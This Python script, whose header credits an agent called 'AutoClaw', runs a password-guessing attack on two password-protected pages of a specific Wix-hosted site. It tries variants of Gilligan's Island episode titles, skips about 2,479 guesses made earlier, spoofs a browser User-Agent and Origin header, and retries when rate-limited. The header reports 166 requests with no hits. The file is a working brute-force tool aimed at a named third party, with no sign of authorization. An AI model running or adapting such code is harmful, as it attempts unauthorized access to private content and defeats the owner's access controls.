# -*- coding: utf-8 -*-
# glimmer_batch4_episodes.py — (2026-10-17, AutoClaw) СЛЕДСТВИЕ: названия эпизодов Gilligan's Island.
# Все 98 названий (Wikipedia, сезоны 1-3) x формы регистра/пробелов, дедуп против секции 8
# HANDOFF (строки 1115:3596, 2479 испытанных) -> 83 новых кандидата x 2 замка (zhgsm, jcl9c).
# Результат: 0 попаданий (166 запросов, ~4.5 мин). Результаты: data/glimmer_batch4_results.txt
import io, json, time, urllib.request, urllib.error
URL="https://site-pages.wix.com/_api/wix-public-html-info-webapp/resolve_protected_page_urls"
META="13cab6fc-e004-4514-aab0-a7cf702047f9"; SITE="b8aa9fe0-61db-4696-8909-9dd877606aa4"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
TARGETS=[("zhgsm","raft-escape"),("jcl9c","smoke-signals")]
def test(pid,pw,timeout=15):
    body=json.dumps({'metaSiteId':META,'siteId':SITE,'pageId':pid,'password':pw}).encode()
    req=urllib.request.Request(URL, data=body, headers={'Content-Type':'application/json','Origin':'https://www.smithlylemoore.com','User-Agent':UA})
    try:
        d=json.loads(urllib.request.urlopen(req, timeout=timeout).read())
        return ('HIT', d.get('payload')) if d.get('success') else ('NO', d.get('errorCode'))
    except urllib.error.HTTPError as e:
        return ('RETRY', e.code) if e.code in (429,500,502,503,504) else ('NO', e.code)
titles=[x.strip() for x in io.open('gilligans_island_episode_titles_98.txt',encoding='utf-8')]
lines=io.open(r'..\data\GLIMMER_HANDOFF_2026-10-17.txt',encoding='utf-8').read().split('\n')
tried=set()
for ln in lines[1115:3596]:
    s=ln.strip()
    if not s or s.startswith('#'): continue
    tried.add(s.lower()); tried.add(s.lower().replace(' ','').replace('-','').replace('_','').replace('.',''))
seen=set(); cands=[]
for t0 in titles:
    t0=t0.replace('[[','').replace(']]','').replace("X' Marks","X Marks").strip()
    for f in (t0, t0.lower(), t0.lower().replace(' ',''), ''.join(w[0].upper()+w[1:] for w in t0.split())):
        k=f.lower().replace(' ','')
        if k in seen: continue
        seen.add(k)
        if f.lower() in tried or k in tried: continue
        cands.append(f)
hits=[]
for c in cands:
    for pid,slug in TARGETS:
        st,info=test(pid,c)
        if st=='RETRY': time.sleep(3); st,info=test(pid,c)
        if st=='HIT': hits.append((pid,slug,c,info)); print('HIT',pid,slug,c)
print('tested %d x2, hits %d'%(len(cands),len(hits)))
